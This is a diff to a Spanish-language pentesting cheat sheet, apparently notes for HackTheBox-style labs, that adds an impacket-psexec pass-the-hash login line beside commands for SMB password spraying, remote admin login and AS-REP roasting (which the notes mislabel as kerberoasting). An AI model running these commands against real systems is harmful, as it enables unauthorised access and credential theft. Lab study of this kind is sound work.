@@ -49,6 +49,7 @@ crackmapexec smb 10.10.10.169 -u ./users -p Welcome123! --no-bruteforce ---> te 
 ```
 ### IMPACKET
 impacket-psexec administrator@10.129.95.187 ---> te logea con administrador, te pide la pass luego
+impacket-psexec  administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 ---> te logea cuando tienes un hash
 sudo impacket-smbserver share ./
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
 ```
